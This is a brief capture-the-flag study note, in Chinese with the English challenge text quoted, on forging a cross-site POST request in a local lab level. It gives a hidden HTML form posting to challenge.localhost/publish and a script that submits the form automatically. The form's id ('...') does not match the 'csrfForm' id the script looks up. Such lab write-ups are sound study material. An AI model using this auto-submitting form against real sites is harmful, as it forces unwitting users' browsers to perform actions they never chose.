#CSRF 2
#挑战简介
Recall that requests that originate from JavaScript run into the Same-Origin Policy, which slightly complicated our CSRF in the previous level. 
You figured out how to make a GET request without JavaScript. Can you do the same for POST?

Recall that a typical POST request is a result of either a JavaScript-invoked request (no good for SOP) or an HTML form submission. 
You'll need to do the latter. Of course, the /challenge/victim won't click the Submit button for you --- you'll have to figure out how to do that yourself 
(HINT: JavaScript can click that button; the request will still count as originating from the form!).

Go POST-CSRF to the flag!

#这题思路和上一题类似，上一题GET请求，这一题就是POST请求了，
#主要用到
<form id="..." action="http://challenge.localhost/publish" method="POST">
    <input type="hidden" name="key" value="value">
    <button type="submit">Submit</button>
</form>

<script>
    document.getElementById('csrfForm').submit();   //自动提交表单
</script>

#基本上就这两个语法，其他的和上一题一样
